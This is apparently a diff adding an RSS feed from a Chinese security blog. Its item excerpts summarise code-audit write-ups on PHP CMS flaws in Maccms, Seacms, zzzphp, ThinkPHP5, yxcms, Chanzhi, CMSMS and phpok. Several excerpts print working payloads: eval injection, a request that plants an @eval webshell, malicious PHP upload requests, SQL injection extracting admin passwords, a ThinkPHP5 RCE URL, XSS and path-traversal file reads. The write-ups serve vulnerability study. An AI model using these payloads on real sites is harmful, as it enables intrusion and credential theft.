@@ -1,0 +1,392 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>代码审计 on F0rmat&#39;Blog</title>
+    <link>https://getshe11.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</link>
+    <description>Recent content in 代码审计 on F0rmat&#39;Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 22 Dec 2019 11:17:18 +0000</lastBuildDate><atom:link href="https://getshe11.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Maccms8最新命令执行漏洞</title>
+      <link>https://getshe11.com/posts/maccms8-latest-command-execution-vulnerability/</link>
+      <pubDate>Sun, 22 Dec 2019 11:17:18 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/maccms8-latest-command-execution-vulnerability/</guid>
+      <description>0x01 前言 太久太久没写文章。。。最近还发布了一些法律，许多网站都关了，我还在考虑是否去开这个博客，因为分享技术还得承担法律责任，不过不会再公布具有攻击性的工具或者exp。
+这个maccms的RCE是最近被绕过了，写一篇分析文。环境搭建的也不多写了，之前写的一篇Maccms的sql注入http://getshe11.com/2018/08/26/Maccms-sql-injection-analysis/ 有讲到 本文用到的源码可以去https://github.com/yaofeifly/Maccms8.x 这里下载 绕过的源码可以去https://github.com/magicblack/maccms8 下载
+0x02 漏洞复现   https://github.com/yaofeifly/Maccms8.x 下载搭建好之后
+  用hackbar
+  url：http://127.0.0.1/maccms888/?m=vod-search
+post：wd={if-A:phpinfo()}{endif-A}
+ 可以看到phpinfo执行了
+  0x03 漏洞分析 phpstorm调试走起，我忽略掉一些步骤，比如怎么用phpstorm调试 这里有写到[Breakpoint debugging with phpstorm+xdebug](http://getshe11.com/2018/04/10/Breakpoint debugging with phpstorm+xdebug/)
+这里不下断点直接从开头断下，具体设置在http://getshe11.com/2018/12/22/ThinkPHP5-remote-code-execution-vulnerability-dynamic-analysis/ 有提到。
+当执行到require(MAC_ROOT.&#39;/inc/common/360_safe3.php&#39;);我们走进去看下，可以看到匹配规则并没有匹配到我们输入的字符,然后继续往下走了。
+到模板内容替换这一块就不跟大家继续走了，大家有时间可以自己走一遍程序的替换流程，我们直接往下走
+到这里，我们F7跟进去
+F8往下走到eval这里可以看到，除了在接受get、post数据那一块有过滤sql语句的检测，到这里没有任何过滤就直接执行了。
+0x04 80w个a绕过匹配漏洞 这个漏洞很有趣，我居然没想到用的是一个P神之前发的一篇文章的PHP利用PCRE回溯次数限制绕过某些安全限制
+这个是Maccms8最新的一个版本里面存在，这个也是修复上面的rce的漏洞的版本。
+payload：
+POST /index.php?m=vod-search HTTP/1.1 Host: xxxx Cache-Control: max-age=0 DNT: 1 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.</description>
+    </item>
+    
+    <item>
+      <title>Seacms9.92从变量覆盖到getshell</title>
+      <link>https://getshe11.com/posts/seacms9.92-from-variable-override-to-getshell/</link>
+      <pubDate>Tue, 22 Oct 2019 11:17:18 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/seacms9.92-from-variable-override-to-getshell/</guid>
+      <description>文章的markdown的版本弄丢了，之前在知乎写的还在
+https://zhuanlan.zhihu.com/p/86986342</description>
+    </item>
+    
+    <item>
+      <title>Seacms&lt;=9.92前台Getshell</title>
+      <link>https://getshe11.com/posts/seacms-front-desk-getshell/</link>
+      <pubDate>Fri, 27 Sep 2019 01:01:30 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/seacms-front-desk-getshell/</guid>
+      <description>0x01 前言 好久没发代码审计的文章了，最近挺多事情的，无意中看到90Sec上面有一篇seacms前台的getshell，突然就很感兴趣，之前审计这套程序的时候也审计了一下，后面太多事情就搁置了。
+0x02 漏洞复现 环境是phpstudy（最近出后门新闻最火的那个），用着也挺方便的。PHP版本是5.x的。 payload：
+http://127.0.0.1/comment/api/index.php?gid=1&amp;amp;page=2&amp;amp;rlist[]=*hex/@eval($_GET[_]);?%3E 然后访问：
+http://127.0.0.1/data/mysqli_error_trace.php?_=phpinfo(); 0x03 漏洞分析 关于这个SQL注入报错的地方，在之前的8.7的一篇文章里面分析过了https://getpass.cn/2019/03/04/Seacms8.7-sql-injection-analysis/
+主要的地方还是在于include/sql.class.php这个文件的465-489行
+它会将sql报错的信息写入了一个PHP的文件里，那我们可以就可以让sql语句报错然后将恶意语句写这个文件利用了。
+0x04 结束 其实这个漏洞还挺简单的，但是在其他的版本代码是不一样的，我测试了9.2的还有之前写SQL注入的8.7版本都是不能利用的。主要代码如下： 这里是说如果我们要删除第476行的两个反斜杠，然后才可以显示报错的内容。我想是在很久之前的版本是直接写入PHP文件的，但是后面作为更新了，就加上这段代码，然后将之前的PHP存在的就删除掉。 但是这个说是9.92版本出现的就很奇怪了。em&amp;hellip;
+文章测试的9.92版本程序下载地址：https://www.lanzous.com/i6eupwh</description>
+    </item>
+    
+    <item>
+      <title>某云分发APP上传漏洞</title>
+      <link>https://getshe11.com/posts/an-app-distribution-system-upload-vulnerability/</link>
+      <pubDate>Fri, 06 Sep 2019 10:47:03 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/an-app-distribution-system-upload-vulnerability/</guid>
+      <description>0x01 前言 大概有几个月没写文章了，最近都在忙(咸鱼),在某此渗透行动中发现的一个洞，感觉是开发留的一个后门。
+0x02 漏洞复现 Payload：
+POST /source/pack/upload/index-uplog.php HTTP/1.1 Host: 127.0.0.1 Connection: close User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZWa8hDK6XlSEJhi7 Accept: */* Accept-Language: zh-CN,zh;q=0.9 Content-Length: 322 ------WebKitFormBoundaryZWa8hDK6XlSEJhi7 Content-Disposition: form-data; name=&amp;quot;app&amp;quot;; filename=&amp;quot;Lighthouse.php&amp;quot; Content-Type: image/jpeg &amp;lt;?php phpinfo();;unlink(__FILE__);?&amp;gt; ------WebKitFormBoundaryZWa8hDK6XlSEJhi7 Content-Disposition: form-data; name=&amp;quot;time&amp;quot; test ------WebKitFormBoundaryZWa8hDK6XlSEJhi7-- 执行后会在\data\tmp下生成test.php文件
+访问url:http://127.0.0.1/data/tmp/test.php
+0x03 漏洞分析 漏洞文件位置:source/pack/upload/index-uplog.php
+&amp;lt;?php if(!empty($_FILES)){ $filepart = pathinfo($_FILES[&amp;#39;app&amp;#39;][&amp;#39;name&amp;#39;]); $extension = strtolower($filepart[&amp;#39;extension&amp;#39;]); if(in_array($extension,array(&amp;#39;ipa&amp;#39;,&amp;#39;apk&amp;#39;,base64_decode(&amp;#39;cGhw&amp;#39;)))){ $time = $_POST[&amp;#39;time&amp;#39;]; $dir = &amp;#39;../../../data/tmp/&amp;#39;.$time.&amp;#39;/&amp;#39;; if(!</description>
+    </item>
+    
+    <item>
+      <title>浅析PHP反序列化漏洞</title>
+      <link>https://getshe11.com/posts/analysis-of-php-deserialization-vulnerabilities/</link>
+      <pubDate>Wed, 05 Jun 2019 17:00:57 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/analysis-of-php-deserialization-vulnerabilities/</guid>
+      <description>0x01 前言 很久没有些文章了，今天复习了反序列化漏洞的知识，顺便写了一篇文章。
+0x02 PHP序列化和反序列化基础 我们想要将数组值存储到数据库时，就可以对数组进行序列化操作，然后将序列化后的值存储到数据库中。其实PHP序列化数组就是将复杂的数组数据类型转换为字符串，方便数组存库操作。对PHP数组进行序列化和反序列化操作，主要就用到两个函数，serialize和unserialize。
+PHP序列化：serialize 在PHP中，序列化用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。
+序列化函数原型如下：
+string serialize ( mixed $value ) 先看个例子
+&amp;lt;? php class TEST { public $data; private $pass; public function __construct($data, $pass) { $this-&amp;gt;data = $data; $this-&amp;gt;pass = $pass; } } $number = 34; $str = &amp;#39;user&amp;#39;; $bool = true; $null = NULL; $arr = array(&amp;#39;a&amp;#39; =&amp;gt; 10, &amp;#39;b&amp;#39; =&amp;gt; 200); $test = new TEST(&amp;#39;uu&amp;#39;, true); var_dump(serialize($number)); var_dump(serialize($str)); var_dump(serialize($bool)); var_dump(serialize($null)); var_dump(serialize($arr)); var_dump(serialize($test)); ?</description>
+    </item>
+    
+    <item>
+      <title>zzzphp1.61 代码审计-从SQL注入到Getshell</title>
+      <link>https://getshe11.com/posts/zzzphp1.61-code-auditing-from-injecting-to-taking-a-shell/</link>
+      <pubDate>Sun, 10 Mar 2019 17:56:36 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/zzzphp1.61-code-auditing-from-injecting-to-taking-a-shell/</guid>
+      <description>0x01 前言 前天看到zzzphp这一个cms，看着有点像zzzcms，去看了也是zzzcms开发的一套程序，于是就去审计一下，这zzzcms我之前也有审计过 https://bbs.ichunqiu.com/thread-14684-1-1.html https://getpass.cn/zzcms-Any-user-password-changes-loopholes-code-points/ https://getpass.cn/ZZCMS8.2-any-file-deleted-to-getshell/ 这套程序漏洞确实比较多，后面也做了很多改善。 那天看了表哥写的一篇PHPCMS的代码审计文章，深有感悟，授人以鱼不如授人以渔，确实是，写那么多审计文章，从审计代码的开始到结束，这种文章少之甚少。我也希望我以后写的文章也带上这种方式。 这套审计的漏洞比较多，SQL注入漏洞、任意文件删除漏洞、任意文件读取漏洞、远程执行漏洞，当中也借助了漏扫工具。废话不多说，直接开始吧。 文章也是原来的方式，先复现后分析。
+0x02 SQL注入漏洞（ 获取管理员密码） 漏洞复现 payload:
+GET /search/ HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=58ebb86ae371bd1f65466b1b94f7a5f7; zzz_adminpass=1;zzz_keys=0&#39;XOR(if(now()=sysdate(),sleep(10),0))XOR&#39;Z Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 对比两次的时间就晓得我们的语句执行成功了，表示存在SQL注入漏洞。 漏洞分析 这个洞是先用AWVS工具扫了一遍出来的，我们审计一套代码的时候可以先试试这些漏扫工具，提高一下效率。虽然有误报但是收集到的信息比手工去检测的效率高。
+大家测试的时候可以用PHPstorm或者vscode这些工具去调试，走一遍整个过程，这样会对程序有所了解。
+再发一次包到search页面会停留到search/index.php文件，这个文件比较简单，包含了一个zzz_client.php的文件。
+&amp;lt;?php define(&amp;#39;LOCATION&amp;#39;, &amp;#39;search&amp;#39;); require dirname(dirname(__FILE__)). &amp;#39;/inc/zzz_client.php&amp;#39;; 进到inc/zzz_client.php文件有一些包含的进来的文件类似模板的文件等，这里通过上面的LOCATION找到$tplfile= TPL_DIR . &#39;search.html&#39;; 
+switch ($location) { case &amp;#39;about&amp;#39;: $tplfile= TPL_DIR .</description>
+    </item>
+    
+    <item>
+      <title>Seacms 8.7版本SQL注入分析</title>
+      <link>https://getshe11.com/posts/seacms8.7-sql-injection-analysis/</link>
+      <pubDate>Mon, 04 Mar 2019 15:49:11 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/seacms8.7-sql-injection-analysis/</guid>
+      <description>0x01 前言 好像没发文章了，在t00ls看到一篇seacms8.7的分析文，不过不是最新的版本，好久没看到seacms和maccms这两个cms发新的漏洞了，那个过滤有点恶心。后来还在nosec看到一篇离新版9.0比较近的一个版本8.9的一个变量覆盖到sql注入文章，但是我复现不成功，我拿的是6.53的版本，原因后面会讲到。
+0x02 环境 Web： phpstudy and MAMP System： Windows 7 X64 and MacOS Browser： Firefox Quantum and Chrome MySQL： 5.5 php： 5.4
+0x03 漏洞详情 漏洞复现 payload:
+http://10.211.55.4/upload/comment/api/index.php?gid=1&amp;amp;page=2&amp;amp;rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(password)from%20sea_admin))),@`%27` 漏洞分析 在此之前我在MySQL 5.6、5.7上面复现都不成功，因为这两个版本用extractvalue()、updatexml()报错注入不成功，后来换了系统Linux和Windows还有macOS来测试也是一样，和PHP、Apache的版本没有影响只要的还是MySQL的版本问题，所以大家测试的时候注意一下版本。
+漏洞文件是在：comment/api/index.php
+&amp;lt;?php session_start(); require_once(&amp;#34;../../include/common.php&amp;#34;); $id = (isset($gid) &amp;amp;&amp;amp; is_numeric($gid)) ? $gid : 0; $page = (isset($page) &amp;amp;&amp;amp; is_numeric($page)) ? $page : 1; $type = (isset($type) &amp;amp;&amp;amp; is_numeric($type)) ? $type : 1; $pCount = 0; $jsoncachefile = sea_DATA.&amp;#34;/cache/review/$type/$id.js&amp;#34;; //缓存第一页的评论 if($page&amp;lt;2) { if(file_exists($jsoncachefile)) { $json=LoadFile($jsoncachefile); die($json); } } $h = ReadData($id,$page); $rlist = array(); if($page&amp;lt;2) { createTextFile($h,$jsoncachefile); } die($h);	function ReadData($id,$page) { global $type,$pCount,$rlist; $ret = array(&amp;#34;&amp;#34;,&amp;#34;&amp;#34;,$page,0,10,$type,$id); if($id&amp;gt;0) { $ret[0] = Readmlist($id,$page,$ret[4]); $ret[3] = $pCount; $x = implode(&amp;#39;,&amp;#39;,$rlist); if(!</description>
+    </item>
+    
+    <item>
+      <title>ThinkPHP5 远程代码执行漏洞动态分析</title>
+      <link>https://getshe11.com/posts/thinkphp5-remote-code-execution-vulnerability-dynamic-analysis/</link>
+      <pubDate>Sat, 22 Dec 2018 11:17:18 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/thinkphp5-remote-code-execution-vulnerability-dynamic-analysis/</guid>
+      <description>0x01 前言 这个漏洞已经过去了十多天了，最近比较忙，一直没有写分析的文章。今天抽点时间出来写一篇动态分析的文章，远程执行漏洞用动态分析比较方便也看出整个执行的过程和一些变量参数。
+ ThinkPHP官方最近修复了一个严重的远程代码执行漏洞。这个主要漏洞原因是由于框架对控制器名没有进行足够的校验导致在没有开启强制路由的情况下可以构造恶意语句执行远程命令，受影响的版本包括5.0和5.1版本。
+ 0x02 环境 程序源码下载：http://www.thinkphp.cn/download/967.html Web环境：Windows 10 x64+PHPStudy 2018 调试工具：phpstorm+xdebug(用vscode也可以，我比较习惯用phpstorm)
+xdebug调试配置可以参考我的一篇文章https://getpass.cn/2018/04/10/Breakpoint%20debugging%20with%20phpstorm+xdebug/
+因为我是从头分析到尾，所以要在设置里面勾上Break at first line in PHP script
+搭建就不多说了，放源码在根目录然后phpstudy启动！
+0x03 漏洞复现 奉上我们的Poc：http://getpass.test/public/index.php?s=index/\think\Request/input&amp;amp;filter=phpinfo&amp;amp;data=1
+其实有很多利用的地方，到后面分析完再说。
+0x04 漏洞分析 因为是从开始分析，也比较适合新手，虽然啰嗦了点哈，我就不演示去下某个断点了，如果有不懂的你们也可以在不懂的地方下一个断点然后继续分析（记得去掉Break at first line in PHP script再下断点）。
+有些不是重点的直接F7或者F8走下去,F7跟进Facade
+到App.php初始化的地方，继续F8往下面走
+到routeCheckF7跟进去
+到这里F7继续跟进去
+有些没有必要的函数就直接F8跳过去,到pathinfo()这里F7跟进去
+我们可以分析一下这个·pathinfo函数的代码$this-&amp;gt;config-&amp;gt;get(&#39;var_pathinfo&#39;)这一句是从配置文件config/app.php获取的值
+当请求报文包含$_GET[&#39;s&#39;]，就取其值作为pathinfo，并返回pathinfo给调用函数，所以我们可利用$_GET[&amp;rsquo;s&#39;]来传递路由信息。
+public function pathinfo() { if (is_null($this-&amp;gt;pathinfo)) { if (isset($_GET[$this-&amp;gt;config-&amp;gt;get(&amp;#39;var_pathinfo&amp;#39;)])) { // 判断URL里面是否有兼容模式参数  $_SERVER[&amp;#39;PATH_INFO&amp;#39;] = $_GET[$this-&amp;gt;config-&amp;gt;get(&amp;#39;var_pathinfo&amp;#39;)]; unset($_GET[$this-&amp;gt;config-&amp;gt;get(&amp;#39;var_pathinfo&amp;#39;)]); } elseif ($this-&amp;gt;isCli()) { // CLI模式下 index.php module/controller/action/params/...  $_SERVER[&amp;#39;PATH_INFO&amp;#39;] = isset($_SERVER[&amp;#39;argv&amp;#39;][1]) ?</description>
+    </item>
+    
+    <item>
+      <title>yxcms 1.4.7 最新版漏洞分析</title>
+      <link>https://getshe11.com/posts/yxcms-1.4.7-latest-version-of-vulnerability-analysis/</link>
+      <pubDate>Mon, 17 Sep 2018 13:16:06 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/yxcms-1.4.7-latest-version-of-vulnerability-analysis/</guid>
+      <description>0x01前言 在先知看到的，大部分都是后台漏洞，部分厂商对于后台的漏洞都不认可，因为厂商觉得能进入后台这些漏洞都不是漏洞。最恐怖的是厂商否认了漏洞存在，然后偷偷的去修复。
+0x02 安装程序 具体的安装和使用的详细可以上官网查看https://www.kancloud.cn/yongheng/yxcms
+0x03 前台XSS 1.漏洞复现  打开链接http://sb.com/index.php?r=default/column/index&amp;amp;col=guestbook 输入payload：&amp;lt;svg/onload=alert(1)&amp;gt;    然后登陆后台，查看审核 点击编辑   2.漏洞分析  前台的文件源码protected/apps/default/controller/columnController.php  public function index() { $ename=in($_GET[&amp;#39;col&amp;#39;]); if(empty($ename)) throw new Exception(&amp;#39;栏目名不能为空~&amp;#39;, 404); $sortinfo=model(&amp;#39;sort&amp;#39;)-&amp;gt;find(&amp;#34;ename=&amp;#39;{$ename}&amp;#39;&amp;#34;,&amp;#39;id,name,ename,path,url,type,deep,method,tplist,keywords,description,extendid&amp;#39;); $path=$sortinfo[&amp;#39;path&amp;#39;].&amp;#39;,&amp;#39;.$sortinfo[&amp;#39;id&amp;#39;]; $deep=$sortinfo[&amp;#39;deep&amp;#39;]+1; $this-&amp;gt;col=$ename; switch ($sortinfo[&amp;#39;type&amp;#39;]) { case 1://文章 $this-&amp;gt;newslist($sortinfo,$path,$deep); break; case 2://图集 $this-&amp;gt;photolist($sortinfo,$path,$deep); break; case 3://单页 $this-&amp;gt;page($sortinfo,$path,$deep); break; case 4://应用 break; case 5://自定义 break; case 6://表单 $this-&amp;gt;extend($sortinfo,$path,$deep); break; default: throw new Exception(&amp;#39;未知的栏目类型~&amp;#39;, 404); break; } }  后台的文件源码protected/apps/admin/controller/extendfieldController.</description>
+    </item>
+    
+    <item>
+      <title>动态调试|Maccms SQL 注入分析(附注入盲注脚本)</title>
+      <link>https://getshe11.com/posts/maccms-sql-injection-analysis/</link>
+      <pubDate>Sun, 26 Aug 2018 15:49:02 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/maccms-sql-injection-analysis/</guid>
+      <description>0x01 前言 已经有一周没发表文章了，一个朋友叫我研究maccms的代码审计，碰到这个注入的漏洞挺有趣的，就在此写一篇分析文。
+0x02 环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7 Tools： JetBrains PhpStorm 2018.1.6 x64、Seay代码审计工具
+搭建这个程序也挺简单的，也是一步到位。
+0x03 漏洞复现  首先在程序的后台添加一条数据  执行我们的payload,可以看到网站跳转延迟了3s以上。 url:http://sb.com/index.php?m=vod-search post:wd=))||if((select%0bascii(length((select(m_name)\`\`from(mac_manager))))=53),(\`sleep\`(3)),0)#%25%35%63  3. 因为是盲注所以注入出管理员的账号密码在下文分析。
+0x04 SQL执行过程分析  先弄清楚sql是如何执行的一个过程，然后再去分析怎么会造成SQL注入的一个过程，这样对学习代码审计也是一个好处。 因为是动态分析，不会的安装调试环境的请到这篇文章按步骤完成安装https://getpass.cn/2018/04/10/Breakpoint%20debugging%20with%20phpstorm+xdebug/ phpstorm打开这个选项，意思就是断在当前脚本文件的第一行，我就不下断点了，跟着它执行的过程走一遍。  我们先随便输入一点数据 访问后会断在index.php的第一行  F8往下走，走到第14行F7跟进去。 然后F8一直往下走，可以看到拦截的规则 走到POST的过滤这里F7进去 arr_foreach函数检查传过来的值是否是数组，不是数组就返回原数据，然后用urldecode函数URL解码。 最后分别对传过来的wd和test两个值进行匹配，如果存在拦截规则里面的字符就跳转到错误信息。 比如你输入wd=/**/就会被拦截 因为/**/存在拦截的正则表达式里面。  走出来会到$m = be(&#39;get&#39;,&#39;m&#39;);这里，这里只是对m传过来的vod-search进行addslashes函数的过滤  我怕文章过长，一些不必要的代码自己去细读一遍就行了，F8一直往下周，走到37行F7进去，因为我们传过来的的参数是vod，所以会包含vod.php文件并执行。  因为我们传参是search所以会走到这里，我们可以F7进去看执行的过程。 在这里会经过urldecode函数的解码，一直循环到不能解码为止，然后经过刚才的StopAttack方法的过滤 最后到htmlEncode方法的替换  跳出到vod.php文件后F8走到这里，F7进去看SQL执行的过程。 一直走到markname的值是vod 然后不用管F8继续往下走，走到这里再F7进去 可以看到SQL执行是到这里，下面是执行的语句 SELECT count(*) FROM {pre}vod WHERE 1=1 AND d_hide=0 AND d_type&amp;gt;0 and d_type not in(0) and d_usergroup in(0) AND ( instr(d_name,&#39;test&#39;)&amp;gt;0 or instr(d_subname,&#39;test&#39;)&amp;gt;0 or instr(d_starring,&#39;test&#39;)&amp;gt;0 )    0x05 漏洞分析 上面分析了SQL执行过程，下面分析这个是如何构成SQL注入的。</description>
+    </item>
+    
+    <item>
+      <title>禅知Pro 1.6 前台任意文件读取分析</title>
+      <link>https://getshe11.com/posts/zen-knowledge-pro-1.6-front-end-arbitrary-file-reading-analysis/</link>
+      <pubDate>Sun, 19 Aug 2018 10:00:02 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/zen-knowledge-pro-1.6-front-end-arbitrary-file-reading-analysis/</guid>
+      <description>0x01 前言 这两天看到禅知这个CMS有一个前台的任意文件读取漏洞，就在此写一片分析文章。
+0x02 环境  下载安装安装程序，这个CMS是封装起来的，连着Apache+MySQL一起打包成exe可执行程序。 安装也比较简单，傻瓜式安装。  0x03 漏洞复现  在网站根目录C:\xampp\chanzhi\www新建一个测试文件test.php  执行payload查看文件内容：http://localhost/file.php?pathname=../test.phpi&amp;amp;t=txt&amp;amp;o=source  执行payload来查看程序的配置文件：http://localhost/file.php?pathname=../http.ini&amp;amp;t=txt&amp;amp;o=source  跨目录读取文件（前提是有目录权限）：http://localhost/file.php?pathname=../../bin/php/backup.php&amp;amp;t=txt&amp;amp;o=source   0x04 漏洞分析 漏洞文件：C:\xampp\chanzhi\www\file.php,从头开始往下分析：
+ 1-19行是定义变量和判断是否GET传值过来，传全称或者简称都可以赋值给对应的变量，比如:http://192.168.86.130/file.php?f=../test.php&amp;amp;t=txt&amp;amp;o=source,pathname和f是对应的，下面的以此类推。 主要是19行，$_SERVER[&#39;SCRIPT_FILENAME&#39;]的值是C:/xampp/chanzhi/www/file.php,加上dirname函数后的值为C:/xampp/chanzhi/www。 rtrim函数是去掉/右边的值然后加上/data/之后$dataRoot的值为C:/xampp/chanzhi/www/data/  &amp;lt;?php $pathname = &amp;#39;&amp;#39;; $objectType = &amp;#39;&amp;#39;; $imageSize = &amp;#39;&amp;#39;; $extension = &amp;#39;&amp;#39;; $version = &amp;#39;&amp;#39;; if(isset($_GET[&amp;#39;pathname&amp;#39;])) $pathname = $_GET[&amp;#39;pathname&amp;#39;]; if(isset($_GET[&amp;#39;objectType&amp;#39;])) $objectType = $_GET[&amp;#39;objectType&amp;#39;]; if(isset($_GET[&amp;#39;imageSize&amp;#39;])) $imageSize = $_GET[&amp;#39;imageSize&amp;#39;]; if(isset($_GET[&amp;#39;extension&amp;#39;])) $extension = $_GET[&amp;#39;extension&amp;#39;]; if(isset($_GET[&amp;#39;f&amp;#39;])) $pathname = $_GET[&amp;#39;f&amp;#39;]; if(isset($_GET[&amp;#39;o&amp;#39;])) $objectType = $_GET[&amp;#39;o&amp;#39;]; if(isset($_GET[&amp;#39;s&amp;#39;])) $imageSize = $_GET[&amp;#39;s&amp;#39;]; if(isset($_GET[&amp;#39;t&amp;#39;])) $extension = $_GET[&amp;#39;t&amp;#39;]; if(isset($_GET[&amp;#39;v&amp;#39;])) $version = $_GET[&amp;#39;v&amp;#39;]; $dataRoot = rtrim(dirname($_SERVER[&amp;#39;SCRIPT_FILENAME&amp;#39;]), &amp;#39;/&amp;#39;) .</description>
+    </item>
+    
+    <item>
+      <title>CVE-2018-1000094-CMSMS 2.2.5代码执行漏洞(每周一洞)</title>
+      <link>https://getshe11.com/posts/cve-2018-1000094-cmsms-2.2.5-code-execution-vulnerability/</link>
+      <pubDate>Sat, 11 Aug 2018 09:31:30 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/cve-2018-1000094-cmsms-2.2.5-code-execution-vulnerability/</guid>
+      <description>0x01 前言 CMS Made Simple是一个简单易于使用的内容管理系统。它使用PHP，MySQL和Smarty模板引擎开发。
+昨天看漏洞库的时候看到这一款CMS，漏洞操作也挺简单的，但是可以申请CVE，于是乎就复现了一篇过程和写漏洞脚本。
+0x02 环境  下载下来是一个安装文件cmsms-2.2.5-install.php，浏览器直接打开  默认Next，到数据库连接这一块要先创建一个数据库，我这里创建一个名为simple的数据库，然后填上数据库连接信息  填写管理账号密码信息  填写可写可读的目录和选择语言  安装完成，除了邮件模块，不过也用不上。   0x03 漏洞复现过程  登录后台   选择File Manager   编写一个文件名为a.txt内容为&amp;lt;?php phpinfo();?&amp;gt;的文件，然后点击上传。   选中a.txt，点击copy,名字改为rce.php,然后确定   文件就copy过来了，有点类似系统的copy命令。   访问rce.php   0x04 漏洞分析过程  还记得上一篇的phpok的分析，如果找不出关键文件，可以抓包分析。 可以看到主要是通过文件admin/moduleinterface.php文件进行操作的。 可能这样看会让人很乱，我们可以用phpstorm的debug来调试整个过程 相关配置可以看https://getpass.cn/2018/04/10/Breakpoint%20debugging%20with%20phpstorm+xdebug/ 从上面的抓包可以看出来，mact参数是FileManager，m1_是fileaction，大家可以去这里下断点然后一步一步分析整个流程。  有经验可以看出来，FileManager就是modules\FileManager目录，fileaction就是modules/FileManager/action.fileaction.php文件，再往下看代码的68行，可以看到我们的copy操作的代码。  if (isset($params[&amp;#34;fileactioncopy&amp;#34;]) || $fileaction==&amp;#34;copy&amp;#34;) { include_once(__DIR__.&amp;#34;/action.copy.php&amp;#34;); return; }  我们找到这个文件action.copy.php，我们在93行下一个断点，然后去操作copy，可以看到有各种很详细的参数信息。  我们F7单步走，可以看到执行$res = copy($src,$dest);的时候没有发生错误。  这样就正式完成了所有操作，如有不懂可以看下官方文档的copy函数的用法http://www.php.net/manual/en/function.copy.php  0x05 漏洞脚本 python版本 # Exploit Title: CMS Made Simple 2.</description>
+    </item>
+    
+    <item>
+      <title>phpok4.9后台getshell(每周一洞)</title>
+      <link>https://getshe11.com/posts/phpok4.9-background-getshell/</link>
+      <pubDate>Mon, 06 Aug 2018 08:19:40 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/phpok4.9-background-getshell/</guid>
+      <description>0x01 前言 昨天看到phpok可以申请cve就去审计了一下，存在漏洞的地方还是挺多的，时间不多找了个简单的任意文件上传漏洞。
+0x02 环境  程序下载：https://www.lanzous.com/i1ksjkd 集成环境是PHPstudy,PHP5.6。 安装程序   4. 先创建一个数据库phpok 5. 设置管理员账号密码 6. 安装成功 0x03 漏洞挖掘过程   打开打开FolderChangesView记录程序的文件变动。   登录后台 程序升级-&amp;gt;压缩包升级   编辑一个测试文件phpinfo.php,压缩为phpinfo.zip上传。   点击上传，压缩包里面的文件会被压缩到网站根目录   访问根目录下新生成的文件   0x04 漏洞分析 漏洞代码出现在framework/admin/update_control.php文件的unzip_f函数,可以看到用到lib里面的phpzip类，有兴趣可以去读下源码framework/libs/phpzip.php 大家可能疑问你怎么知道漏洞文件是这个，可以抓包来查看整过利用的过程，然后再去源码分析。 public function unzip_f() { $zipfile = $this-&amp;gt;get(&amp;#39;zipfile&amp;#39;); if(!$zipfile){ $this-&amp;gt;error(P_Lang(&amp;#39;未指定附件文件&amp;#39;)); } if(strpos($zipfile,&amp;#39;..&amp;#39;) !== false){ $this-&amp;gt;error(P_Lang(&amp;#39;不支持带..上级路径&amp;#39;)); } if(!file_exists($this-&amp;gt;dir_root.$zipfile)){ $this-&amp;gt;error(P_Lang(&amp;#39;ZIP文件不存在&amp;#39;)); } $this-&amp;gt;lib(&amp;#39;phpzip&amp;#39;)-&amp;gt;unzip($this-&amp;gt;dir_root.$zipfile,&amp;#39;data/update/&amp;#39;); $info = $this-&amp;gt;update_load(); if(!$info || (is_array($info) &amp;amp;&amp;amp; $info[&amp;#39;status&amp;#39;] == &amp;#39;error&amp;#39;)){ $this-&amp;gt;error($info[&amp;#39;content&amp;#39;]); } $this-&amp;gt;success(); } 可以看到用到lib里面的phpzip类，有兴趣可以去读下源码framework/libs/phpzip.</description>
+    </item>
+    
+    <item>
+      <title>phpok 4.9代码审计(每周一洞)</title>
+      <link>https://getshe11.com/posts/phpok-4.9-code-audit/</link>
+      <pubDate>Sun, 05 Aug 2018 14:54:07 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/phpok-4.9-code-audit/</guid>
+      <description>0x01 前言 一放暑假就特别多事情，很多事情都耽误了，看吐司文章看到一篇不错的审计文章，就学习下。
+0x02 环境搭建 环境没什么要求PHPstudy就能搞定，这个要先创建数据库再安装程序的。
